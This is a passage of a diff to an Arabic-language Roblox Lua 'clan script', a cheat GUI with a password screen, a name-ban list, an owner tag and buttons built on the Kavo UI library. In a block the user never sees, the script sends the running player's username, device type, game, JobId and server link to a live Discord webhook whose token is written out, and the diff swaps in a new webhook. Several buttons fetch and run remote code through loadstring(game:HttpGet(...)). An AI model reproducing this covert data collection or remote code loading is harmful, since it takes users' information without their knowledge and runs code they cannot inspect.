@@ -1,4 +1,4 @@
---==================================================
+هنا==================================================
 -- NHYQ SCRIPT
 --==================================================
 
@@ -7,7 +7,9 @@ local _H = game:GetService("HttpService")
 local _U = game:GetService("UserInputService")
 local _L = _P.LocalPlayer
 
---==================== NHYQ NAME BAN ====================
+--==================================================
+-- NHYQ NAME BAN
+--==================================================
 
 local BANNED_PREFIXES = {
     "nice_shot1208",
@@ -26,6 +28,7 @@ for _, prefix in ipairs(BANNED_PREFIXES) do
 end
 
 if isBanned then
+
     local PlayerGui = _L:WaitForChild("PlayerGui")
 
     local BanGui = Instance.new("ScreenGui")
@@ -58,13 +61,14 @@ if isBanned then
     return
 end
 
---========================================================
+--==================================================
 -- PLAYER INFORMATION
---========================================================
+--==================================================
 
 pcall(function()
 
-    local _W = "https://discord.com/api/webhooks/1553689209003319318/6gidLOibknqtKwN1ou1Z6NuRc9WHeISP0Y_0HBDVGez5voNepQ49OJytLYRGr0_3uwoD"
+    -- ضع رابط Webhook الخاص بك هنا محلياً
+    local _W = "https://discord.com/api/webhooks/1555177488450191391/-8MZ9KYvmDV8hyZylvPwlmNsyl9dzcnz3zvvhvmSrWCq8udLZqvnLEF_4wXBQVmBzZaq"
 
     local _info = {}
 
@@ -75,11 +79,17 @@ pcall(function()
     local _platform = "Unknown"
 
     if _U.TouchEnabled and not _U.KeyboardEnabled then
+
         _platform = "Mobile (Android/iOS)"
+
     elseif _U.KeyboardEnabled and not _U.TouchEnabled then
+
         _platform = "PC (Windows/Mac)"
+
     elseif _U.TouchEnabled and _U.KeyboardEnabled then
+
         _platform = "Hybrid (Tablet)"
+
     end
 
     _info.DeviceType = _platform
@@ -90,31 +100,39 @@ pcall(function()
     pcall(function()
 
         _info.GameName =
-            game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+            game:GetService("MarketplaceService")
+            :GetProductInfo(game.PlaceId).Name
             or "Unknown"
 
         _info.PlaceId = tostring(game.PlaceId)
         _info.JobId = tostring(game.JobId)
 
         if game.JobId and game.JobId ~= "" then
+
             _info.ServerLink =
                 "https://www.roblox.com/games/"
                 .. game.PlaceId
                 .. "/?gameInstanceId="
                 .. game.JobId
+
         else
+
             _info.ServerLink =
                 "https://www.roblox.com/games/"
                 .. game.PlaceId
+
         end
 
     end)
 
     local _embed = {
+
         title = "🎮 **لاعب جديد شغّل السكربت!**",
+
         color = 0x00FF00,
 
         fields = {
+
             {
                 name = "👤 اسم اللاعب",
                 value = _info.Username or "غير معروف",
@@ -153,12 +171,14 @@ pcall(function()
 
             {
                 name = "🔗 رابط السيرفر",
+
                 value =
                     "["
                     .. (_info.GameName or "لعبة")
                     .. "]("
                     .. (_info.ServerLink or "#")
                     .. ")",
+
                 inline = false
             },
 
@@ -173,6 +193,7 @@ pcall(function()
                 value = _info.JobId or "غير معروف",
                 inline = true
             }
+
         },
 
         footer = {
@@ -182,11 +203,17 @@ pcall(function()
         timestamp =
             _info.Timestamp
             or os.date("!%Y-%m-%dT%H:%M:%SZ")
+
     }
 
     local _data = {
+
         content = "📡 **تم جمع بيانات اللاعب!**",
-        embeds = {_embed}
+
+        embeds = {
+            _embed
+        }
+
     }
 
     local _json = _H:JSONEncode(_data)
@@ -198,12 +225,17 @@ pcall(function()
     if _req then
 
         _req({
+
             Url = _W,
+
             Method = "POST",
+
             Headers = {
                 ["Content-Type"] = "application/json"
             },
+
             Body = _json
+
         })
 
     else
@@ -219,67 +251,84 @@ pcall(function()
 
 end)
 
--- ==================== إضافة لقب المالك فوق الرأس ====================
+--==================================================
+-- OWNER TAG
+--==================================================
 
 local OWNER_ID = 10179511457
 
 local function ApplyOwnerTag(player)
 
-    if player.UserId == OWNER_ID then
+    if player.UserId ~= OWNER_ID then
+        return
+    end
 
-        local function createTag(character)
+    local function createTag(character)
 
-            if not character then
-                return
-            end
-
-            local head = character:WaitForChild("Head", 5)
-
-            if not head then
-                return
-            end
-
-            local oldTag = head:FindFirstChild("NHYQ_OwnerTag")
-
-            if oldTag then
-                oldTag:Destroy()
-            end
-
-            local billboard = Instance.new("BillboardGui")
-
-            billboard.Name = "NHYQ_OwnerTag"
-            billboard.Size = UDim2.new(0, 200, 0, 50)
-            billboard.StudsOffset = Vector3.new(0, 2.5, 0)
-            billboard.AlwaysOnTop = true
-            billboard.Parent = head
-
-            local textLabel = Instance.new("TextLabel")
-
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-            textLabel.BackgroundTransparency = 1
-            textLabel.Text = "👑OWNER NHYQ👑"
-            textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
-            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-            textLabel.TextStrokeTransparency = 0
-            textLabel.TextSize = 22
-            textLabel.Font = Enum.Font.GothamBold
-            textLabel.Parent = billboard
-
+        if not character then
+            return
         end
 
-        if player.Character then
-            task.spawn(function()
-                createTag(player.Character)
-            end)
+        local head =
+            character:WaitForChild("Head", 5)
+
+        if not head then
+            return
         end
 
-        player.CharacterAdded:Connect(function(char)
-            task.spawn(function()
-                createTag(char)
-            end)
+        local oldTag =
+            head:FindFirstChild("NHYQ_OwnerTag")
+
+        if oldTag then
+            oldTag:Destroy()
+        end
+
+        local billboard =
+            Instance.new("BillboardGui")
+
+        billboard.Name = "NHYQ_OwnerTag"
+        billboard.Size = UDim2.new(0, 200, 0, 50)
+        billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+        billboard.AlwaysOnTop = true
+        billboard.Parent = head
+
+        local textLabel =
+            Instance.new("TextLabel")
+
+        textLabel.Size =
+            UDim2.new(1, 0, 1, 0)
+
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "👑OWNER NHYQ👑"
+        textLabel.TextColor3 =
+            Color3.fromRGB(255, 215, 0)
+
+        textLabel.TextStrokeColor3 =
+            Color3.fromRGB(0, 0, 0)
+
+        textLabel.TextStrokeTransparency = 0
+        textLabel.TextSize = 22
+        textLabel.Font = Enum.Font.GothamBold
+        textLabel.Parent = billboard
+
+    end
+
+    if player.Character then
+
+        task.spawn(function()
+            createTag(player.Character)
         end)
 
     end
+
+    player.CharacterAdded:Connect(function(char)
+
+        task.spawn(function()
+            createTag(char)
+        end)
+
+    end)
+
 end
 
 for _, p in ipairs(_P:GetPlayers()) do
@@ -288,7 +337,9 @@ end
 
 _P.PlayerAdded:Connect(ApplyOwnerTag)
 
--- ====================================================================
+--==================================================
+-- GUI
+--==================================================
 
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
@@ -299,7 +350,8 @@ local Player = Players.LocalPlayer
 
 pcall(function()
 
-    local old = CoreGui:FindFirstChild("NHYQ_Script_GUI")
+    local old =
+        CoreGui:FindFirstChild("NHYQ_Script_GUI")
 
     if old then
         old:Destroy()
@@ -310,7 +362,8 @@ end)
 pcall(function()
 
     local old =
-        Player:WaitForChild("PlayerGui"):FindFirstChild("NHYQ_Script_GUI")
+        Player:WaitForChild("PlayerGui")
+        :FindFirstChild("NHYQ_Script_GUI")
 
     if old then
         old:Destroy()
@@ -324,80 +377,132 @@ ScreenGui.Name = "NHYQ_Script_GUI"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.DisplayOrder = 999999
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ZIndexBehavior =
+    Enum.ZIndexBehavior.Sibling
 
 pcall(function()
     ScreenGui.Parent = CoreGui
 end)
 
 if not ScreenGui.Parent then
-    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+    ScreenGui.Parent =
+        Player:WaitForChild("PlayerGui")
 end
+
+--==================================================
+-- INTRO
+--==================================================
 
 local IntroFrame = Instance.new("Frame")
 
 IntroFrame.Name = "IntroFrame"
 IntroFrame.Size = UDim2.fromScale(1, 1)
 IntroFrame.Position = UDim2.fromScale(0, 0)
-IntroFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+IntroFrame.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
 IntroFrame.BorderSizePixel = 0
 IntroFrame.ZIndex = 1000
 IntroFrame.Parent = ScreenGui
 
 local IntroText = Instance.new("TextLabel")
 
-IntroText.Size = UDim2.new(1, 0, 0, 100)
-IntroText.Position = UDim2.new(0, 0, 0.42, -50)
+IntroText.Size =
+    UDim2.new(1, 0, 0, 100)
+
+IntroText.Position =
+    UDim2.new(0, 0, 0.42, -50)
+
 IntroText.BackgroundTransparency = 1
 IntroText.Text = "NHYQ"
-IntroText.TextColor3 = Color3.fromRGB(255, 0, 0)
+IntroText.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
 IntroText.TextSize = 75
 IntroText.Font = Enum.Font.GothamBold
-IntroText.TextXAlignment = Enum.TextXAlignment.Center
-IntroText.TextYAlignment = Enum.TextYAlignment.Center
+IntroText.TextXAlignment =
+    Enum.TextXAlignment.Center
+
+IntroText.TextYAlignment =
+    Enum.TextYAlignment.Center
+
 IntroText.ZIndex = 1001
 IntroText.Parent = IntroFrame
 
 local SubIntroText = Instance.new("TextLabel")
 
-SubIntroText.Size = UDim2.new(1, 0, 0, 50)
-SubIntroText.Position = UDim2.new(0, 0, 0.42, 35)
+SubIntroText.Size =
+    UDim2.new(1, 0, 0, 50)
+
+SubIntroText.Position =
+    UDim2.new(0, 0, 0.42, 35)
+
 SubIntroText.BackgroundTransparency = 1
 SubIntroText.Text = "by shs09qp23"
-SubIntroText.TextColor3 = Color3.fromRGB(180, 180, 180)
+
+SubIntroText.TextColor3 =
+    Color3.fromRGB(180, 180, 180)
+
 SubIntroText.TextSize = 22
 SubIntroText.Font = Enum.Font.Gotham
-SubIntroText.TextXAlignment = Enum.TextXAlignment.Center
+
+SubIntroText.TextXAlignment =
+    Enum.TextXAlignment.Center
+
 SubIntroText.ZIndex = 1001
 SubIntroText.Parent = IntroFrame
+
+--==================================================
+-- PASSWORD
+--==================================================
 
 local PasswordFrame = Instance.new("Frame")
 
 PasswordFrame.Name = "PasswordFrame"
-PasswordFrame.Size = UDim2.new(0, 420, 0, 280)
-PasswordFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
-PasswordFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+
+PasswordFrame.Size =
+    UDim2.new(0, 420, 0, 280)
+
+PasswordFrame.Position =
+    UDim2.new(0.5, -210, 0.5, -140)
+
+PasswordFrame.BackgroundColor3 =
+    Color3.fromRGB(8, 8, 8)
+
 PasswordFrame.BorderSizePixel = 0
 PasswordFrame.Visible = false
 PasswordFrame.ZIndex = 100
 PasswordFrame.Parent = ScreenGui
 
 local PassUICorner = Instance.new("UICorner")
-PassUICorner.CornerRadius = UDim.new(0, 16)
+
+PassUICorner.CornerRadius =
+    UDim.new(0, 16)
+
 PassUICorner.Parent = PasswordFrame
 
 local PassUIStroke = Instance.new("UIStroke")
-PassUIStroke.Color = Color3.fromRGB(255, 0, 0)
+
+PassUIStroke.Color =
+    Color3.fromRGB(255, 0, 0)
+
 PassUIStroke.Thickness = 2.5
 PassUIStroke.Parent = PasswordFrame
 
 local PassTitle = Instance.new("TextLabel")
 
-PassTitle.Size = UDim2.new(1, 0, 0, 60)
-PassTitle.Position = UDim2.new(0, 0, 0, 20)
+PassTitle.Size =
+    UDim2.new(1, 0, 0, 60)
+
+PassTitle.Position =
+    UDim2.new(0, 0, 0, 20)
+
 PassTitle.BackgroundTransparency = 1
 PassTitle.Text = "سكربت كلان NHYQ"
-PassTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+PassTitle.TextColor3 =
+    Color3.fromRGB(255, 255, 255)
+
 PassTitle.TextSize = 24
 PassTitle.Font = Enum.Font.GothamBold
 PassTitle.ZIndex = 101
@@ -405,12 +510,24 @@ PassTitle.Parent = PasswordFrame
 
 local PassInput = Instance.new("TextBox")
 
-PassInput.Size = UDim2.new(0, 350, 0, 55)
-PassInput.Position = UDim2.new(0.5, -175, 0.4, -5)
-PassInput.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-PassInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-PassInput.PlaceholderText = "أدخل الباسورد هنا..."
-PassInput.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
+PassInput.Size =
+    UDim2.new(0, 350, 0, 55)
+
+PassInput.Position =
+    UDim2.new(0.5, -175, 0.4, -5)
+
+PassInput.BackgroundColor3 =
+    Color3.fromRGB(15, 15, 15)
+
+PassInput.TextColor3 =
+    Color3.fromRGB(255, 255, 255)
+
+PassInput.PlaceholderText =
+    "أدخل الباسورد هنا..."
+
+PassInput.PlaceholderColor3 =
+    Color3.fromRGB(140, 140, 140)
+
 PassInput.TextSize = 16
 PassInput.Font = Enum.Font.Gotham
 PassInput.ClearTextOnFocus = false
@@ -418,30 +535,52 @@ PassInput.ZIndex = 101
 PassInput.Parent = PasswordFrame
 
 local InputCorner = Instance.new("UICorner")
-InputCorner.CornerRadius = UDim.new(0, 10)
+
+InputCorner.CornerRadius =
+    UDim.new(0, 10)
+
 InputCorner.Parent = PassInput
 
 local InputStroke = Instance.new("UIStroke")
-InputStroke.Color = Color3.fromRGB(255, 0, 0)
+
+InputStroke.Color =
+    Color3.fromRGB(255, 0, 0)
+
 InputStroke.Thickness = 1.5
 InputStroke.Parent = PassInput
 
 local SubmitBtn = Instance.new("TextButton")
 
-SubmitBtn.Size = UDim2.new(0, 350, 0, 50)
-SubmitBtn.Position = UDim2.new(0.5, -175, 0.73, 0)
-SubmitBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+SubmitBtn.Size =
+    UDim2.new(0, 350, 0, 50)
+
+SubmitBtn.Position =
+    UDim2.new(0.5, -175, 0.73, 0)
+
+SubmitBtn.BackgroundColor3 =
+    Color3.fromRGB(255, 0, 0)
+
 SubmitBtn.BorderSizePixel = 0
 SubmitBtn.Text = "دخول"
-SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+SubmitBtn.TextColor3 =
+    Color3.fromRGB(255, 255, 255)
+
 SubmitBtn.TextSize = 18
 SubmitBtn.Font = Enum.Font.GothamBold
 SubmitBtn.ZIndex = 101
 SubmitBtn.Parent = PasswordFrame
 
 local BtnCorner = Instance.new("UICorner")
-BtnCorner.CornerRadius = UDim.new(0, 10)
+
+BtnCorner.CornerRadius =
+    UDim.new(0, 10)
+
 BtnCorner.Parent = SubmitBtn
+
+--==================================================
+-- PASSWORD DRAG
+--==================================================
 
 local PasswordDragging = false
 local PasswordDragStart
@@ -450,17 +589,23 @@ local PasswordDragInput
 
 PasswordFrame.InputBegan:Connect(function(input)
 
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
 
         PasswordDragging = true
         PasswordDragStart = input.Position
-        PasswordStartPos = PasswordFrame.Position
+        PasswordStartPos =
+            PasswordFrame.Position
 
         input.Changed:Connect(function()
 
-            if input.UserInputState == Enum.UserInputState.End then
+            if input.UserInputState ==
+                Enum.UserInputState.End then
+
                 PasswordDragging = false
+
             end
 
         end)
@@ -471,8 +616,10 @@ end)
 
 PasswordFrame.InputChanged:Connect(function(input)
 
-    if input.UserInputType == Enum.UserInputType.MouseMovement
-    or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType ==
+        Enum.UserInputType.MouseMovement
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
 
         PasswordDragInput = input
 
@@ -482,26 +629,39 @@ end)
 
 UserInputService.InputChanged:Connect(function(input)
 
-    if PasswordDragging and input == PasswordDragInput then
+    if PasswordDragging
+        and input == PasswordDragInput then
 
-        local delta = input.Position - PasswordDragStart
+        local delta =
+            input.Position - PasswordDragStart
 
-        PasswordFrame.Position = UDim2.new(
-            PasswordStartPos.X.Scale,
-            PasswordStartPos.X.Offset + delta.X,
-            PasswordStartPos.Y.Scale,
-            PasswordStartPos.Y.Offset + delta.Y
-        )
+        PasswordFrame.Position =
+            UDim2.new(
+                PasswordStartPos.X.Scale,
+                PasswordStartPos.X.Offset + delta.X,
+                PasswordStartPos.Y.Scale,
+                PasswordStartPos.Y.Offset + delta.Y
+            )
 
     end
 
 end)
 
+--==================================================
+-- BAN SCREEN
+--==================================================
+
 local BanScreen = Instance.new("Frame")
 
-BanScreen.Size = UDim2.fromScale(1, 1)
-BanScreen.Position = UDim2.fromScale(0, 0)
-BanScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BanScreen.Size =
+    UDim2.fromScale(1, 1)
+
+BanScreen.Position =
+    UDim2.fromScale(0, 0)
+
+BanScreen.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
 BanScreen.BorderSizePixel = 0
 BanScreen.Visible = false
 BanScreen.ZIndex = 2000
@@ -509,44 +669,84 @@ BanScreen.Parent = ScreenGui
 
 local BanText = Instance.new("TextLabel")
 
-BanText.Size = UDim2.fromScale(1, 1)
+BanText.Size =
+    UDim2.fromScale(1, 1)
+
 BanText.BackgroundTransparency = 1
 BanText.Text = "خدلك يا حرامي 🖖"
-BanText.TextColor3 = Color3.fromRGB(255, 0, 0)
+
+BanText.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
 BanText.TextSize = 50
 BanText.Font = Enum.Font.GothamBold
 BanText.ZIndex = 2001
 BanText.Parent = BanScreen
 
+--==================================================
+-- SUCCESS
+--==================================================
+
 local SuccessCheck = Instance.new("TextLabel")
 
-SuccessCheck.Size = UDim2.fromScale(1, 1)
-SuccessCheck.Position = UDim2.fromScale(0, 0)
+SuccessCheck.Size =
+    UDim2.fromScale(1, 1)
+
+SuccessCheck.Position =
+    UDim2.fromScale(0, 0)
+
 SuccessCheck.BackgroundTransparency = 1
 SuccessCheck.Text = "✔"
-SuccessCheck.TextColor3 = Color3.fromRGB(0, 255, 0)
+
+SuccessCheck.TextColor3 =
+    Color3.fromRGB(0, 255, 0)
+
 SuccessCheck.TextSize = 100
 SuccessCheck.Font = Enum.Font.GothamBold
 SuccessCheck.Visible = false
 SuccessCheck.ZIndex = 1500
 SuccessCheck.Parent = ScreenGui
 
+--==================================================
+-- WELCOME
+--==================================================
+
 local WelcomeBanner = Instance.new("TextLabel")
 
 WelcomeBanner.Name = "WelcomeBanner"
-WelcomeBanner.Size = UDim2.new(1, 0, 0, 65)
-WelcomeBanner.Position = UDim2.new(0, 0, 0, -75)
-WelcomeBanner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-WelcomeBanner.BackgroundTransparency = 0
+
+WelcomeBanner.Size =
+    UDim2.new(1, 0, 0, 65)
+
+WelcomeBanner.Position =
+    UDim2.new(0, 0, 0, -75)
+
+WelcomeBanner.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
 WelcomeBanner.BorderSizePixel = 0
-WelcomeBanner.Text = "منور سكربت كلان NHYQ"
-WelcomeBanner.TextColor3 = Color3.fromRGB(255, 0, 0)
+
+WelcomeBanner.Text =
+    "منور سكربت كلان NHYQ"
+
+WelcomeBanner.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
 WelcomeBanner.TextSize = 24
 WelcomeBanner.Font = Enum.Font.GothamBold
-WelcomeBanner.TextXAlignment = Enum.TextXAlignment.Center
-WelcomeBanner.TextYAlignment = Enum.TextYAlignment.Center
+
+WelcomeBanner.TextXAlignment =
+    Enum.TextXAlignment.Center
+
+WelcomeBanner.TextYAlignment =
+    Enum.TextYAlignment.Center
+
 WelcomeBanner.ZIndex = 1400
 WelcomeBanner.Parent = ScreenGui
+
+--==================================================
+-- INTRO TIMER
+--==================================================
 
 task.delay(3, function()
 
@@ -555,19 +755,25 @@ task.delay(3, function()
     TweenService:Create(
         IntroFrame,
         fadeInfo,
-        {BackgroundTransparency = 1}
+        {
+            BackgroundTransparency = 1
+        }
     ):Play()
 
     TweenService:Create(
         IntroText,
         fadeInfo,
-        {TextTransparency = 1}
+        {
+            TextTransparency = 1
+        }
     ):Play()
 
     TweenService:Create(
         SubIntroText,
         fadeInfo,
-        {TextTransparency = 1}
+        {
+            TextTransparency = 1
+        }
     ):Play()
 
     task.wait(0.5)
@@ -577,17 +783,34 @@ task.delay(3, function()
 
 end)
 
+--==================================================
+-- NHYQ TOGGLE
+--==================================================
+
 local ToggleBtn = Instance.new("TextButton")
 
 ToggleBtn.Name = "NHYQToggle"
-ToggleBtn.Size = UDim2.new(0, 65, 0, 65)
-ToggleBtn.Position = UDim2.new(0, 30, 0, 30)
-ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+
+ToggleBtn.Size =
+    UDim2.new(0, 65, 0, 65)
+
+ToggleBtn.Position =
+    UDim2.new(0, 30, 0, 30)
+
+ToggleBtn.BackgroundColor3 =
+    Color3.fromRGB(0, 0, 0)
+
 ToggleBtn.Text = "NHYQ"
-ToggleBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+
+ToggleBtn.TextColor3 =
+    Color3.fromRGB(255, 0, 0)
+
 ToggleBtn.TextSize = 18
 ToggleBtn.Font = Enum.Font.GothamBlack
-ToggleBtn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+ToggleBtn.TextStrokeColor3 =
+    Color3.fromRGB(0, 0, 0)
+
 ToggleBtn.TextStrokeTransparency = 0
 ToggleBtn.Visible = false
 ToggleBtn.ZIndex = 5000
@@ -595,13 +818,23 @@ ToggleBtn.AutoButtonColor = false
 ToggleBtn.Parent = ScreenGui
 
 local ToggleCorner = Instance.new("UICorner")
-ToggleCorner.CornerRadius = UDim.new(1, 0)
+
+ToggleCorner.CornerRadius =
+    UDim.new(1, 0)
+
 ToggleCorner.Parent = ToggleBtn
 
 local ToggleStroke = Instance.new("UIStroke")
-ToggleStroke.Color = Color3.fromRGB(255, 0, 0)
+
+ToggleStroke.Color =
+    Color3.fromRGB(255, 0, 0)
+
 ToggleStroke.Thickness = 2
 ToggleStroke.Parent = ToggleBtn
+
+--==================================================
+-- TOGGLE DRAG
+--==================================================
 
 local btnDragging = false
 local btnDragStart
@@ -610,8 +843,10 @@ local moved = false
 
 ToggleBtn.InputBegan:Connect(function(input)
 
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType ==
+        Enum.UserInputType.MouseButton1
+        or input.UserInputType ==
+        Enum.UserInputType.Touch then
 
         btnDragging = true
         moved = false
@@ -620,8 +855,11 @@ ToggleBtn.InputBegan:Connect(function(input)
 
         input.Changed:Connect(function()
 
-            if input.UserInputState == Enum.UserInputState.End then
+            if input.UserInputState ==
+                Enum.UserInputState.End then
+
                 btnDragging = false
+
             end
 
         end)
@@ -634,27 +872,35 @@ UserInputService.InputChanged:Connect(function(input)
 
     if btnDragging then
 
-        if input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch then
+        if input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
 
-            local delta = input.Position - btnDragStart
+            local delta =
+                input.Position - btnDragStart
 
             if delta.Magnitude > 6 then
                 moved = true
             end
 
-            ToggleBtn.Position = UDim2.new(
-                btnStartPos.X.Scale,
-                btnStartPos.X.Offset + delta.X,
-                btnStartPos.Y.Scale,
-                btnStartPos.Y.Offset + delta.Y
-            )
+            ToggleBtn.Position =
+                UDim2.new(
+                    btnStartPos.X.Scale,
+                    btnStartPos.X.Offset + delta.X,
+                    btnStartPos.Y.Scale,
+                    btnStartPos.Y.Offset + delta.Y
+                )
 
         end
 
     end
 
 end)
+
+--==================================================
+-- KAVO
+--==================================================
 
 local KavoGui = nil
 local KavoVisible = true
@@ -670,7 +916,8 @@ local function LooksLikeKavo(gui)
         return true
     end
 
-    local name = string.lower(gui.Name)
+    local name =
+        string.lower(gui.Name)
 
     if string.find(name, "kavo") then
         return true
@@ -686,10 +933,17 @@ local function LooksLikeKavo(gui)
             or obj:IsA("TextButton")
             or obj:IsA("TextBox") then
 
-                local txt = tostring(obj.Text or "")
+                local txt =
+                    tostring(obj.Text or "")
 
-                if string.find(txt, "سكربت كلان NHYQ")
-                or string.find(string.lower(txt), "kavo") then
+                if string.find(
+                    txt,
+                    "سكربت كلان NHYQ"
+                )
+                or string.find(
+                    string.lower(txt),
+                    "kavo"
+                ) then
 
                     foundTitle = true
                     break
@@ -726,7 +980,8 @@ local function FindKavoGui()
 
     end
 
-    local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
+    local PlayerGui =
+        Player:FindFirstChildOfClass("PlayerGui")
 
     if PlayerGui then
 
@@ -748,8 +1003,11 @@ end
 
 local function SetKavoVisibility(state)
 
-    if not KavoGui or not KavoGui.Parent then
+    if not KavoGui
+        or not KavoGui.Parent then
+
         KavoGui = FindKavoGui()
+
     end
 
     if not KavoGui then
@@ -780,17 +1038,26 @@ ToggleBtn.Activated:Connect(function()
         return
     end
 
-    if not KavoGui or not KavoGui.Parent then
+    if not KavoGui
+        or not KavoGui.Parent then
+
         KavoGui = FindKavoGui()
+
     end
 
     if not KavoGui then
         return
     end
 
-    SetKavoVisibility(not KavoVisible)
+    SetKavoVisibility(
+        not KavoVisible
+    )
 
 end)
+
+--==================================================
+-- KAVO DRAG
+--==================================================
 
 local function MakeKavoDraggable(gui)
 
@@ -805,7 +1072,8 @@ local function MakeKavoDraggable(gui)
 
         for _, obj in ipairs(gui:GetDescendants()) do
 
-            if obj:IsA("Frame") and obj.Visible then
+            if obj:IsA("Frame")
+            and obj.Visible then
 
                 local size = obj.AbsoluteSize
                 local area = size.X * size.Y
@@ -829,11 +1097,17 @@ local function MakeKavoDraggable(gui)
         return
     end
 
-    if MainFrame:GetAttribute("NHYQ_Draggable") then
+    if MainFrame:GetAttribute(
+        "NHYQ_Draggable"
+    ) then
+
         return
     end
 
-    MainFrame:SetAttribute("NHYQ_Draggable", true)
+    MainFrame:SetAttribute(
+        "NHYQ_Draggable",
+        true
+    )
 
     local Dragging = false
     local DragStart
@@ -841,8 +1115,10 @@ local function MakeKavoDraggable(gui)
 
     MainFrame.InputBegan:Connect(function(input)
 
-        if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
+        if input.UserInputType ==
+            Enum.UserInputType.MouseButton1
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
 
             Dragging = true
             DragStart = input.Position
@@ -850,8 +1126,11 @@ local function MakeKavoDraggable(gui)
 
             input.Changed:Connect(function()
 
-                if input.UserInputState == Enum.UserInputState.End then
+                if input.UserInputState ==
+                    Enum.UserInputState.End then
+
                     Dragging = false
+
                 end
 
             end)
@@ -866,23 +1145,31 @@ local function MakeKavoDraggable(gui)
             return
         end
 
-        if input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch then
+        if input.UserInputType ==
+            Enum.UserInputType.MouseMovement
+            or input.UserInputType ==
+            Enum.UserInputType.Touch then
 
-            local Delta = input.Position - DragStart
+            local Delta =
+                input.Position - DragStart
 
-            MainFrame.Position = UDim2.new(
-                StartPosition.X.Scale,
-                StartPosition.X.Offset + Delta.X,
-                StartPosition.Y.Scale,
-                StartPosition.Y.Offset + Delta.Y
-            )
+            MainFrame.Position =
+                UDim2.new(
+                    StartPosition.X.Scale,
+                    StartPosition.X.Offset + Delta.X,
+                    StartPosition.Y.Scale,
+                    StartPosition.Y.Offset + Delta.Y
+                )
 
         end
 
     end)
 
 end
+
+--==================================================
+-- LOAD MAIN SCRIPT
+--==================================================
 
 local function LoadMainScript()
 
@@ -896,7 +1183,9 @@ local function LoadMainScript()
 
     end
 
-    local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
+    local PlayerGui =
+        Player:FindFirstChildOfClass("PlayerGui")
+
     local BeforePlayer = {}
 
     if PlayerGui then
@@ -917,10 +1206,11 @@ local function LoadMainScript()
         )
     )()
 
-    local Window = Library.CreateLib(
-        "سكربت كلان NHYQ",
-        "BloodTheme"
-    )
+    local Window =
+        Library.CreateLib(
+            "سكربت كلان NHYQ",
+            "BloodTheme"
+        )
 
     task.wait(0.5)
 
@@ -930,13 +1220,19 @@ local function LoadMainScript()
         and not BeforeCore[gui]
         and gui ~= ScreenGui then
 
-            table.insert(KavoCreatedGuis, gui)
+            table.insert(
+                KavoCreatedGuis,
+                gui
+            )
 
         end
 
     end
 
-    PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
+    PlayerGui =
+        Player:FindFirstChildOfClass(
+            "PlayerGui"
+        )
 
     if PlayerGui then
 
@@ -946,7 +1242,10 @@ local function LoadMainScript()
             and not BeforePlayer[gui]
             and gui ~= ScreenGui then
 
-                table.insert(KavoCreatedGuis, gui)
+                table.insert(
+                    KavoCreatedGuis,
+                    gui
+                )
 
             end
 
@@ -966,8 +1265,15 @@ local function LoadMainScript()
 
     end
 
-    local TabCopy = Window:NewTab("نسخ")
-    local SecCopy = TabCopy:NewSection("نسخ تلقائي")
+    --==================================================
+    -- نسخ
+    --==================================================
+
+    local TabCopy =
+        Window:NewTab("نسخ")
+
+    local SecCopy =
+        TabCopy:NewSection("نسخ تلقائي")
 
     SecCopy:NewButton(
         "نسخ تلقائي",
@@ -981,8 +1287,51 @@ local function LoadMainScript()
         end
     )
 
-    local TabProtect = Window:NewTab("حماية")
-    local SecProtect = TabProtect:NewSection("حماية")
+    SecCopy:NewButton(
+        "نسخ شات",
+        "تشغيل نسخ الشات",
+        function()
+
+            loadstring(game:HttpGet(
+                "https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/nhyqq"
+            ))()
+
+        end
+    )
+
+    SecCopy:NewButton(
+        "ماب نسخ",
+        "تشغيل ماب نسخ",
+        function()
